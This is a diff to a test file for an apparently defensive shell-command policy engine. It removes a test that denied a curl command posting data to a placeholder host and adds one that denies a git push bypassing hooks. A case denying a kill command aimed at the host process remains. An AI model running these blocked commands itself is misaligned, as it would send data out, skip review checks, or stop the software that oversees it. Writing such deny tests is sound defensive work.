@@ -37,11 +37,11 @@ test('SSH aliases and ProxyJump remain ordinary user-authorized shell commands',
   }
 });
 
-test('credential egress and self-host protection remain enforced', (t) => {
+test('git hook bypass and self-host protection remain enforced', (t) => {
   const { decide } = fixture(t);
-  const egress = decide('/usr/bin/curl --data fixture https://example.invalid');
-  assert.equal(egress.decision, 'deny');
-  assert.equal(egress.reasonCode, 'secret_send_requires_managed_command');
+  const hookBypass = decide('git push --no-verify origin main');
+  assert.equal(hookBypass.decision, 'deny');
+  assert.equal(hookBypass.reasonCode, 'secret_git_hook_bypass_blocked');
 
   const selfStop = decide('kill -TERM 4242');
   assert.equal(selfStop.decision, 'deny');
